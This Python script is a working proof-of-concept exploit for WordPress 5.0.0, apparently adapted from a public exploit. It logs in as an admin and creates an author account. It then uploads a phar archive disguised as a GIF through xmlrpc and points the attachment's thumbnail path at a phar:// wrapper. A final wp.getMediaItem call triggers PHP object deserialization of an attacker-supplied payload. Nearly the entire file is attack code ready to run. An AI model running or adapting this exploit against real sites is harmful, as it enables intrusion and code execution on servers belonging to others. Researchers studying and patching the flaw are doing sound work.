# Wordpress (5.0.0) - PoC
import requests
import sys
from bs4 import BeautifulSoup
import base64
import random
import re

# import http.client as http_client
# http_client.HTTPConnection.debuglevel = 1
# Ref #1. https://github.com/cystack/Wordpress-phar-deserialization/blob/master/exploit.py

def printUsageAndExit():
    print("[#] Usage: python [BASEURL] [ADMINID] [ADMINPW] [PHAR_PATH]")
    exit()

def login(baseurl, adminid, adminpw):
    URL = "{}{}".format(baseurl, "/wp-login.php")
    login_data = {
            "log": adminid,
            "pwd": adminpw,
            "wp-submit": "Log In",
            "redirect_to": "{}{}".format(baseurl, "/wp-admin/"),
            "testcookie": "1"
            }
    header = {
	        "Cookie": "wordpress_test_cookie=WP Cookie check",
            }
	
    
    with requests.Session() as session:
        r = session.post(URL, data = login_data, headers = header)
        if(r.text.find("Lost your password?") > -1):
            print("[!] Login Failed!");
            exit()
        else:
            return session

def create_user(baseurl, adminsession, userid, userpw):
    create_url = "{}{}".format(baseurl, "/wp-admin/user-new.php")
    r = adminsession.get(create_url)
    soup = BeautifulSoup(r.text, features="html.parser")
    wp_nonce = soup.find("input", {"name": "_wpnonce_create-user"})['value']
    wp_referer = soup.find("input", {"name": "_wp_http_referer"})['value']

    create_data = {
            "action": "createuser",
            "_wpnonce_create-user": wp_nonce,
            "_wp_http_referer": wp_referer,
            "user_login": userid,
            "email": "test_reset@test.com",
            "first_name": "",
            "last_name": "",
            "url": "",
            "pass1": userpw,
            "pass1-text": userpw,
            "pass2": userpw,
            "role": "author",
            "createuser": "Add New User"
            }
    
    user_create = adminsession.post(create_url, data = create_data)
    if(user_create.text.find("This email is already registered") > -1):
        print("[#] E-mail (test_reset@test.com) already exists. (Skip create user)")
    else:
        print("[+] Success user create")

    return True

# From Ref #1
def upload_file(baseurl, user_session, userid, userpw, phar_file='phar.phar'):
    with open(phar_file, 'rb') as f:
        b64 = base64.b64encode(f.read())
    PAYLOAD = """
    <?xml version="1.0"?>
<methodCall>
 <methodName>wp.uploadFile</methodName>
 <params>
 <param>
<value>
 <string>1</string>
 </value>
</param>
 <param>
<value>
 <string>{username}</string>
 </value>
</param>
 <param>
<value>
 <string>{password}</string>
 </value>
</param>
<param>
 <value>
<struct>
 <member><name>name</name><value>{file_name}.gif</value></member>
 <member><name>type</name><value>image/gif</value></member>
 <member><name>bits</name><value><base64>{b64}</base64></value></member>
</struct>
 </value>
 </param>
</params>
</methodCall>
    """
    print("[#] Uploading Phar (Stage #1)")
    file_name = str(random.randint(100, 999))
    payload_send = PAYLOAD.format(username=userid, password=userpw, b64=b64.decode(), file_name=file_name)
    headers = {'Content-type': 'text/xml'}
    # TODO: handle more specific exceptions
    res = user_session.post(baseurl + '/xmlrpc.php', headers=headers, data=payload_send)
    pattern1 = 'url</name><value><string>([^<>]*)'
    pattern2 = 'id</name><value><string>(\d+)'
    upload_path = re.search(pattern1, res.text).group(1)
    attachment_id = re.search(pattern2, res.text).group(1)
    return upload_path, attachment_id


def SetFileAndThumbnailPath(baseurl, user_session, attachment_id, phar_path):
    print("[#] Setting File (Stage #2)")
    
    edit_data = "post={}&action=edit".format(attachment_id)
    edit_url = "{}{}?{}".format(baseurl, "/wp-admin/post.php", edit_data)
    nonce_req = user_session.get(edit_url)
    soup = BeautifulSoup(nonce_req.text, 'html.parser')
    wp_nonce = soup.find("input", {"id": "_wpnonce"})['value']
    wp_referer = soup.find("input", {"name": "_wp_http_referer"})['value']

    data = {'_wpnonce': wp_nonce,
            '_wp_http_referer': wp_referer,
            'action': 'editpost',
            'post_type': 'attachment',
            'file': 'Z:\Z', # Core
            'post_ID': attachment_id}

    res = user_session.post(baseurl + '/wp-admin/post.php', data=data, allow_redirects=False)
    if(res.status_code != 302):
        print ("[-] Failed set file!")
        exit()
 
    data = {'_wpnonce': wp_nonce,
            '_wp_http_referer': wp_referer,
            'action': 'editattachment',
            'thumb': phar_path,
            'post_ID': attachment_id}
    res = user_session.post(baseurl + '/wp-admin/post.php', data=data, allow_redirects=False)
    
    if(res.status_code != 302):
        print ("[-] Failed set thumbnamil path!")
        exit()

def TriggerBug(baseurl, user_session, userid, userpw, attachment_id):
    print("[#] Trigger Unserialization Bug (Stage #3)")
    PAYLOAD = """
    <?xml version="1.0"?>
<methodCall>
 <methodName>wp.getMediaItem</methodName>
 <params>
 <param>
<value>
 <string>1</string>
 </value>
</param>
 <param>
<value>
 <string>{username}</string>
 </value>
</param>
 <param>
<value>
 <string>{password}</string>
 </value>
</param>
<param>
       <value>
         <int>{id}</int>
       </value>
     </param>
</params>
</methodCall>
    """
    trigger_data = PAYLOAD.format(username=userid, password=userpw, id=attachment_id)
    res = user_session.post(baseurl + '/xmlrpc.php', data=trigger_data)
    # print(res.text)

if __name__ != '__main__':
    exit()

if(len(sys.argv) < 5):
    printUsageAndExit()

BASEURL = sys.argv[1]
ADMINID = sys.argv[2]
ADMINPW = sys.argv[3]
PHAR_PATH = sys.argv[4]
NORMAL_USERID = "test_reset"
NORMAL_USERPW = "reset_password"

admin_session = login(BASEURL, ADMINID, ADMINPW)
print("[+] Success Admin Login")
create_user(BASEURL, admin_session, NORMAL_USERID, NORMAL_USERPW)
user_session = login(BASEURL, NORMAL_USERID, NORMAL_USERPW)
print("[+] Success User Login")
upload_path, attachment_id = upload_file(BASEURL, user_session, NORMAL_USERID, NORMAL_USERPW, PHAR_PATH)
local_path = upload_path[upload_path.index('wp-content'):]
print("[+] Uploaded Path: {}".format(upload_path))
print("[+] Local Path: {}".format(local_path))
# phar_path = "phar:///var/www/html/apps/wordpress/{}".format(local_path)
phar_path = "phar://./{}".format(local_path)
SetFileAndThumbnailPath(BASEURL, user_session, attachment_id, phar_path)
TriggerBug(BASEURL, user_session, NORMAL_USERID, NORMAL_USERPW, attachment_id)